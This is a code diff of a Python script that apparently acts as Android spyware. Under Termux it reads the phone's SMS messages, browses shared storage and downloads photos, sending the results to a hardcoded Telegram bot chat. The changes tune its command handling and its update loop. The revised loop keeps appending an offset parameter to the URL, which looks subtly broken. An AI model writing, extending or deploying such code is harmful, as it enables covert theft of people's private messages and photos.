@@ -11,7 +11,6 @@ CHAT_ID = '6285177516'
 # Global variable to store current folder path and download state
 current_folder = "/storage/emulated/0/"
 download_event = Event()  # Event to control the download process
-download_event.set()      # Initially allow downloading
 
 # Function to send message to Telegram
 def send_to_telegram(message):
@@ -104,7 +103,7 @@ def handle_folder_navigation(folder_name):
 # Function to get SMS details
 def get_sms():
     try:
-        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE)
+        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE, check=True)
         sms_list = json.loads(result.stdout.decode('utf-8'))
         if sms_list:
             messages = []
@@ -195,7 +194,7 @@ def handle_telegram_update(update):
                 handle_folder_navigation("")  # Show initial folder contents
 
             elif message == "/download_photo":
-                if download_event.is_set():
+                if not download_event.is_set():
                     send_to_telegram("Starting photo download...")
                     download_event.set()  # Ensure downloading is allowed
                     download_thread = Thread(target=download_images)
@@ -204,8 +203,11 @@ def handle_telegram_update(update):
                     send_to_telegram("Photo download is already in progress.")
 
             elif message == "/download_photo_stop":
-                download_event.clear()  # Stop downloading
-                send_to_telegram("Photo download stopped.")
+                if download_event.is_set():
+                    download_event.clear()  # Stop downloading
+                    send_to_telegram("Photo download stopped.")
+                else:
+                    send_to_telegram("No photo download is in progress to stop.")
 
             else:
                 folder_path = os.path.join(current_folder, message)
@@ -222,20 +224,21 @@ def handle_telegram_update(update):
 def listen_for_updates():
     last_update_id = None
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
-    
-    while True:
-        params = {'timeout': 100, 'offset': last_update_id}
-        response = requests.get(url, params=params)
-        updates = response.json().get('result', [])
-        
-        for update in updates:
-            last_update_id = update['update_id'] + 1
-            handle_telegram_update(update)
 
+    while True:
+        try:
+            if last_update_id:
+                url += f"?offset={last_update_id + 1}"
+            response = requests.get(url)
+            updates = response.json().get('result', [])
+
+            for update in updates:
+                last_update_id = update.get('update_id')
+                handle_telegram_update(update)
+
+        except Exception as e:
+            send_to_telegram(f"Error listening for updates: {str(e)}")
+
+# Start listening for Telegram updates
 if __name__ == "__main__":
-    # Step 1: Start in the base folder and show the list of files/folders
-    send_to_telegram(f"Current folder: `{current_folder}`")
-    handle_folder_navigation("")  # Show initial folder contents
-    
-    # Step 2: Listen for user input (folder, file, SMS, device info, photo download)
     listen_for_updates()
